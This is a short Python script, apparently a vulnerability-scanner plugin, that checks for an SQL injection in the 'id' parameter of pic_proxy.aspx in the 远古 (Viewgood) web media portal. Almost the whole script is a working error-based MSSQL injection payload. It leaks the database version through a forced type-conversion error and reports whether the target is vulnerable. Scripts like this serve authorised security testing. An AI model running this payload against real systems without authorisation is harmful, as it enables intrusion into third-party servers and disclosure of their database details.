#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 远古 pic_proxy.aspx SQL注入
referer: unknown
author: Lucifer
description: 文件 pic_proxy.aspx中,参数id存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['远古 pic_proxy.aspx SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/viewgood/webmedia/portal/pic_proxy.aspx?id=1%20and%201%3Dconvert%28int%2C%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%2b@@version%2b%20CHAR%28116%29%20%2b%20CHAR%28121%29%20%2b%20CHAR%28113%29%29--&type=2"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"tyqMicrosoft" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
